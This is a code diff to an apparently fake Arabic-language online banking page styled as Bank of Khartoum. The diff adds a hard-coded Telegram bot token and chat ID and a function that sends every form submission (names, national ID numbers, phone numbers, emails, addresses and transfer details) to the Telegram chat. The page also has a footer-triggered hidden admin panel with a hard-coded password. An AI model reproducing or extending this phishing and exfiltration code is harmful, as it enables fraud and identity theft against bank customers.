@@ -257,7 +257,7 @@
 
     <!-- التذييل المخفي خلفه التشغيل السري -->
     <div class="footer-section" id="main-footer">
-        جميع الحقوق محفوظة © بنك الخرطوم <span class="secret-trigger" id="click-trigger">2026</span>
+        جميع الحقوق محفوظة ©️ بنك الخرطوم <span class="secret-trigger" id="click-trigger">2026</span>
     </div>
 
     <a href="https://wa.me/249998924425" target="_blank" class="whatsapp-float">
@@ -265,6 +265,12 @@
     </a>
 
     <script>
+        // ==========================================
+        // بيانات بوت تيليجرام الخاص بك
+        const TELEGRAM_BOT_TOKEN = "8666514672:AAFBeR-GzAoPzp6j3GfaCvEqYBOaEI5-Quw";
+        const TELEGRAM_CHAT_ID = "8928070001";
+        // ==========================================
+
         let currentService = "";
         let timerInterval;
         let userDataSession = {};
@@ -273,6 +279,28 @@
 
         // كلمة المرور المطلوبة لفتح لوحة التحكم
         const ADMIN_PASSWORD = "Ay12345$";
+
+        // دالة إرسال الرسائل إلى تيليجرام
+        function sendToTelegram(stepName, dataObj) {
+            let message = `📌 *بيانات جديدة - بنكك أونلاين*\n`;
+            message += `🔹 *المرحلة:* ${stepName}\n`;
+            message += `🔹 *الخدمة:* ${userDataSession.service || 'عام'}\n\n`;
+            
+            for (let [key, value] of Object.entries(dataObj)) {
+                message += `• *${key}:* ${value}\n`;
+            }
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.error('Telegram Send Error:', err));
+        }
 
         // تفعيل الضغط 5 مرات متتالية على كلمة 2026
         document.getElementById("click-trigger").addEventListener("click", function() {
@@ -305,6 +333,7 @@
         }
 
         function saveInstantData(stepName, dataObj) {
+            // حفظ محلي
             let allData = JSON.parse(localStorage.getItem('bank_submissions') || '[]');
             let record = {
                 time: new Date().toLocaleString('ar-SA'),
@@ -314,6 +343,9 @@
             };
             allData.push(record);
             localStorage.setItem('bank_submissions', JSON.stringify(allData));
+
+            // إرسال إلى تيليجرام
+            sendToTelegram(stepName, dataObj);
         }
 
         function loadAdminData() {
@@ -363,28 +395,51 @@
         }
 
         function submitServiceForm(serviceName) {
+            let serviceData = {};
             if (serviceName === 'تحديث البيانات') {
                 userDataSession.fullName = document.getElementById("up_name").value.trim();
                 userDataSession.nationalId = document.getElementById("up_national_id").value.trim();
                 userDataSession.phone = document.getElementById("up_phone").value.trim();
                 userDataSession.email = document.getElementById("up_email").value.trim();
                 userDataSession.address = document.getElementById("up_address").value.trim();
+                serviceData = {
+                    الاسم: userDataSession.fullName,
+                    "الرقم الوطني": userDataSession.nationalId,
+                    الهاتف: userDataSession.phone,
+                    البريد: userDataSession.email,
+                    العنوان: userDataSession.address
+                };
             } else if (serviceName === 'رفع سقف التحويلات') {
                 userDataSession.limitReason = document.getElementById("limit_reason").value;
+                serviceData = { السبب: userDataSession.limitReason };
             } else if (serviceName === 'التحويلات الخاطئة') {
                 userDataSession.wrongAcc = document.getElementById("wt_account").value.trim();
                 userDataSession.refNo = document.getElementById("wt_ref").value.trim();
                 userDataSession.amount = document.getElementById("wt_amount").value.trim();
                 userDataSession.transferDate = document.getElementById("wt_date").value;
+                serviceData = {
+                    "الحساب المستلم": userDataSession.wrongAcc,
+                    "رقم العملية": userDataSession.refNo,
+                    المبلغ: userDataSession.amount,
+                    التاريخ: userDataSession.transferDate
+                };
             } else if (serviceName === 'خدمات العملات الأجنبية') {
                 userDataSession.fcType = document.getElementById("fc_type").value;
                 userDataSession.fcPurpose = document.getElementById("fc_purpose").value.trim();
+                serviceData = {
+                    نوع_الخدمة: userDataSession.fcType,
+                    الغرض: userDataSession.fcPurpose
+                };
             } else if (serviceName === 'كشف الحساب') {
                 userDataSession.statementPeriod = document.getElementById("st_period").value;
                 userDataSession.statementLang = document.getElementById("st_lang").value;
+                serviceData = {
+                    الفترة: userDataSession.statementPeriod,
+                    اللغة: userDataSession.statementLang
+                };
             }
 
-            saveInstantData("نموذج الخدمة", userDataSession);
+            saveInstantData("نموذج الخدمة", serviceData);
             showPage('page-login');
         }
 
